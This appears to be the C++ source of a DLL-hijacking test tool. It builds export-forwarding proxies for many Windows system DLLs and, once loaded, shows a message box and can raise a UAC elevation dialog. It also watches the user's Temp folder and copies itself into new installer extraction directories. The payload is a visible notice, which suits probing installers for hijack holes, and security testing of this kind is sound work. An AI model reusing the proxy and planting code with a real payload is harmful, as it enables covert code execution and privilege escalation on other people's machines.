// dllmain.cpp : Defines the entry point for the DLL application.
#include <windows.h>

static DWORD CALLBACK WatchDirectory(LPVOID pParam)
{
    // Credits: https://gist.github.com/nickav/a57009d4fcc3b527ed0f5c9cf30618f8

    WCHAR path[MAX_PATH];
    DWORD const path_len = ExpandEnvironmentStringsW(
        L"%USERPROFILE%\\AppData\\Local\\Temp", path, MAX_PATH);

    HANDLE file = CreateFile(path,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED,
        NULL);

    if (file == INVALID_HANDLE_VALUE)
        return 0;

    OVERLAPPED overlapped;
    overlapped.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

    union
    {
        DWORD dw[];
        BYTE b[1024];
    } change_buf;

    while (ReadDirectoryChangesW(
        file, &change_buf, sizeof change_buf, TRUE,
        FILE_NOTIFY_CHANGE_DIR_NAME,
        NULL, &overlapped, NULL))
    {
        DWORD bytes_transferred = 0;
        GetOverlappedResult(file, &overlapped, &bytes_transferred, TRUE);

        DWORD offset = 0;
        do
        {
            FILE_NOTIFY_INFORMATION* event = (FILE_NOTIFY_INFORMATION*)(change_buf.b + offset);

            WCHAR name[MAX_PATH];
            DWORD name_len = event->FileNameLength / sizeof(WCHAR) + 1;
            lstrcpynW(name, event->FileName, name_len);

            if (event->Action == FILE_ACTION_ADDED)
            {
                if (name[0] == '7' && name[1] == 'z')
                {
                    path[path_len] = L'\0';
                    lstrcatW(path, L"\\");
                    lstrcatW(path, name);
                    DWORD attr = GetFileAttributesW(path);
                    if (attr & FILE_ATTRIBUTE_DIRECTORY)
                    {
                        GetModuleFileNameW(static_cast<HMODULE>(pParam), name, MAX_PATH);
                        LPWSTR q = NULL;
                        WCHAR full[MAX_PATH];
                        GetFullPathNameW(name, MAX_PATH, full, &q);
                        lstrcatW(path, L"\\");
                        LPWSTR p = path + lstrlenW(path);
                        lstrcpyW(p, q);
                        CopyFileW(full, path, TRUE);
                        // Copy any accompanying DLLs like so:
                        // lstrcpyW(p, lstrcpyW(q, L"iertutil.dll"));
                        // CopyFileW(full, path, TRUE);
                        CloseHandle(file);
                        return 0;
                    }
                }
            }
            offset = event->NextEntryOffset;
        } while (offset); // as long as there are more events to handle
    }
}

extern "C" BOOL WINAPI _DllMainCRTStartup(HMODULE hModule, DWORD ul_reason_for_call, LPVOID)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH &&
        GetProcAddress(hModule, "DLLHijackTest_PostBuild") == NULL)
    {
        // Notify user
        WCHAR szWho[MAX_PATH];
        GetModuleFileName(hModule, szWho, MAX_PATH);
        int ret = MessageBoxW(NULL,
            L"Shit happens. Do you want to know the details?", szWho, MB_YESNOCANCEL);
        if (ret == IDCANCEL)
            return FALSE;
        // Observe what happens in %USERPROFILE%\AppData\Local\Temp
        CreateThread(NULL, 0, WatchDirectory, hModule, 0, NULL);
        if (ret == IDNO)
            return TRUE;
        // Loader lock issues can happen, but installers can also silently kill threads.
        // Therefore, go without a dedicated thread for the UACSelfElevation dialog.
        ret = wWinMain(hModule, NULL, lstrcpyW(szWho, L"DLLHijackTest"), SW_SHOWNORMAL);
        return ret != IDABORT;
    }
    return TRUE;
}

#ifdef _WIN64
extern "C" void _GapFiller() { }
#else
extern "C" void GapFiller() { }
#endif

static void CreateProxyFor(LPCSTR name)
{
    char path[MAX_PATH];
    char *end = path + GetSystemDirectoryA(path, MAX_PATH);
    *end++ = '\\';
    lstrcpyA(end, name);

    if (HMODULE const hModule = LoadLibraryExA(path, NULL, LOAD_LIBRARY_AS_DATAFILE))
    {
        BYTE* const pORG = reinterpret_cast<BYTE*>(reinterpret_cast<INT_PTR>(hModule) & ~1);
        IMAGE_DOS_HEADER const* const pMZ = reinterpret_cast<IMAGE_DOS_HEADER const*>(pORG);
        IMAGE_NT_HEADERS const* const pPE = reinterpret_cast<IMAGE_NT_HEADERS const*>(pORG + pMZ->e_lfanew);

        if (pPE->FileHeader.SizeOfOptionalHeader != sizeof pPE->OptionalHeader)
            FatalAppExitA(0, "mismatched bitness");

        IMAGE_SECTION_HEADER const* pSH = IMAGE_FIRST_SECTION(pPE);
        WORD nSH = pPE->FileHeader.NumberOfSections;
        DWORD offset = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        // Search for the section which contains the offset at hand
        while ((pSH->VirtualAddress > offset || pSH->VirtualAddress + pSH->Misc.VirtualSize <= offset) && --nSH)
            ++pSH;

        if (nSH == 0)
            FatalAppExitA(0, "section not found");

        BYTE const* const pRD = pORG == reinterpret_cast<BYTE*>(hModule) ? pORG : pORG + pSH->PointerToRawData - pSH->VirtualAddress;
        IMAGE_EXPORT_DIRECTORY const* const pEAT = reinterpret_cast<IMAGE_EXPORT_DIRECTORY const*>(pRD + offset);
        ULONG const* const rgAddressOfNames = reinterpret_cast<ULONG const*>(pRD + pEAT->AddressOfNames);
        USHORT const* const rgAddressOfNameOrdinals = reinterpret_cast<USHORT const*>(pRD + pEAT->AddressOfNameOrdinals);
        BYTE* const rgfUsedOrdinals = static_cast<BYTE*>(LocalAlloc(LPTR, USHRT_MAX + 1));

        char* dot = end;
        while (*dot != '.') ++dot;
        dot[1] = 'c';
        dot[2] = '\0';

        char cmd[1024];
        wsprintfA(cmd, "cl %s /link /dll /out:%s dllmain.obj "
            "CppUACSelfElevation.obj CppUACSelfElevation.res "
            "kernel32.lib user32.lib advapi32.lib", end, name);

        HFILE file = _lcreat(end, 0);
        dot[1] = '\0';

        while (end > path) if (*--end == '\\') *end = '/';

        for (DWORD i = 0; i < pEAT->NumberOfNames; ++i)
        {
            name = reinterpret_cast<LPCSTR>(pRD + rgAddressOfNames[i]);
            DWORD j = rgAddressOfNameOrdinals[i];
            rgfUsedOrdinals[j] = TRUE;
            char line[1024];
            int length = wsprintfA(line, "#pragma comment(linker, \"/export:%s=%s%s,@%u\")\n", name, path, name, j + pEAT->Base);
            _lwrite(file, line, length);
        }

        // Ensure a consecutive sequence of ordinals by filling in the gaps
        for (DWORD j = 0; j < pEAT->NumberOfFunctions; ++j)
        {
            if (rgfUsedOrdinals[j])
                continue;
            char line[1024];
            int length = wsprintfA(line, "#pragma comment(linker, \"/export:%u=_GapFiller,@%u,NONAME\")\n", j, j + pEAT->Base);
            _lwrite(file, line, length);
        }

        _lclose(file);

        LocalFree(rgfUsedOrdinals);

        WinExec(cmd, SW_SHOWNORMAL);
    }
}

void WINAPI DLLHijackTest_PostBuild(HWND, HINSTANCE, LPSTR lpCmdLine, int)
{
    if (IsDebuggerPresent())
    {
        //CreateProxyFor(lpCmdLine);
        WatchDirectory(GetModuleHandle(L"DLLHijackTest.dll"));
        return;
    }

    SetCurrentDirectoryA(lpCmdLine);
    CreateProxyFor("authz.dll");
    CreateProxyFor("bcrypt.dll");
    CreateProxyFor("crypt32.dll");
    CreateProxyFor("d3d9.dll");
    CreateProxyFor("d3d11.dll");
    CreateProxyFor("d3d12.dll");
    CreateProxyFor("dwmapi.dll");
    CreateProxyFor("DWrite.dll");
    CreateProxyFor("dxgi.dll");
    CreateProxyFor("imm32.dll");
    CreateProxyFor("IPHLPAPI.DLL");
    CreateProxyFor("MPR.DLL");
    CreateProxyFor("netapi32.dll");
    CreateProxyFor("ncrypt.dll");
    CreateProxyFor("secur32.dll");
    CreateProxyFor("setupapi.dll");
    CreateProxyFor("sfc.dll");
    CreateProxyFor("userenv.dll");
    CreateProxyFor("uxtheme.dll");
    CreateProxyFor("version.dll");
    CreateProxyFor("winhttp.dll");
    CreateProxyFor("winmm.dll");
    CreateProxyFor("wtsapi32.dll");
}
